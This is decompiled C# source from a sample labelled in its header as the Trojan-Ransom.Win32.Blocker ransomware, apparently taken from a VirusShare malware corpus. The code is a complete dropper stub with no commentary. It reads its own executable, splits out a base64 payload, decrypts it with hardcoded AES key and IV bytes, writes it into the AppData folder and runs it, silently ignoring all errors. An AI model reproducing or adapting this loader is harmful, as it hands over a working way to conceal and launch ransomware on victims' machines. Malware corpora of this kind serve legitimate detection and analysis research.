// Decompiled with JetBrains decompiler
// Type: Element.Element
// Assembly: SimpleLK, Version=8.3.9.6, Culture=neutral, PublicKeyToken=null
// MVID: 649A622C-D408-4194-9755-7C47086344DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.aljd-fbbc42f76be24739efbff50003d3bb0b0d102bfebf2b4553cedbcf29afcadcbb.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Element
{
  internal class Element
  {
    private static byte[] ProgramC;
    private static string[] bestandsnaam;
    private static string binnentekst;
    private static string applicatiedatamap;
    private static string[] spleef = new string[1]
    {
      "[jMNWHJWw6cnLv87oEkqldf]"
    };

    private static void Main(string[] args)
    {
      try
      {
        Element.Element.binnentekst = Element.Element.Rally();
        Element.Element.applicatiedatamap = Element.Element.haalmap();
        Element.Element.bestandsnaam = Element.Element.binnesplitje();
        Element.Element.ProgramC = Element.Element.Cerrus(Convert.FromBase64String(Element.Element.bestandsnaam[1]));
        Element.Element.BioWr();
        Element.Element.DiaProStart();
      }
      catch
      {
      }
    }

    private static bool DiaProStart()
    {
      try
      {
        Process.Start(Element.Element.applicatiedatamap + "\\" + Element.Element.bestandsnaam[2]);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static bool BioWr()
    {
      try
      {
        File.WriteAllBytes(Element.Element.applicatiedatamap + "\\" + Element.Element.bestandsnaam[2], Element.Element.ProgramC);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static string[] binnesplitje()
    {
      try
      {
        return Element.Element.binnentekst.Split(Element.Element.spleef, StringSplitOptions.None);
      }
      catch
      {
        return new string[2]{ "x", "y" };
      }
    }

    private static string Rally()
    {
      try
      {
        return File.ReadAllText(Process.GetCurrentProcess().MainModule.FileName);
      }
      catch
      {
        return "";
      }
    }

    private static byte[] Cerrus(byte[] RdlmKey)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] numArray1 = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        byte[] numArray2 = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        rijndaelManaged.IV = numArray1;
        rijndaelManaged.Key = numArray2;
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RdlmKey, 0, RdlmKey.Length);
      }
      catch
      {
        return (byte[]) null;
      }
    }

    private static string haalmap()
    {
      try
      {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      }
      catch
      {
        return "";
      }
    }
  }
}
